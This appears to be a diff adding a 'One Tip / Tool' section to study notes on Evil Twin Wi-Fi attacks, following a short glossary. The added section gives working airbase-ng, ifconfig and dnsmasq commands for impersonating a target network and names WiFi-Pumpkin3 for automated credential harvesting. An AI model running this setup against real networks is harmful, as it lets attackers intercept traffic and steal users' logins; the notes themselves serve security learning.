@@ -48,3 +48,22 @@ From a defender's side, using a VPN on all networks is the strongest personal de
 - Captive Portal: a web page shown to newly connected users, often used legitimately by hotels and cafes, abused by attackers to steal credentials
 - 802.1X: enterprise Wi-Fi authentication standard that uses certificates instead of passwords, resistant to Evil Twin
 - Rogue AP: any unauthorized access point on a network, Evil Twin is a specific type of rogue AP
+
+## One Tip / Tool
+
+Tool: `airbase-ng` (part of aircrack-ng suite) or `hostapd-wpe` for setting up rogue APs
+
+```bash
+# quick evil twin with airbase-ng
+airmon-ng start wlan0
+airbase-ng -e "TargetSSID" -c 6 wlan0mon
+
+# the above creates a tap interface at0
+# bring it up and assign IP
+ifconfig at0 up 192.168.1.1 netmask 255.255.255.0
+
+# run dnsmasq for DHCP
+dnsmasq --interface=at0 --dhcp-range=192.168.1.2,192.168.1.100,12h
+```
+
+For a more complete automated Evil Twin attack with captive portal, **WiFi-Pumpkin3** is a dedicated framework that handles AP creation, DHCP, DNS spoofing, and credential harvesting all in one tool. Only use on networks you own or have explicit permission to test on.
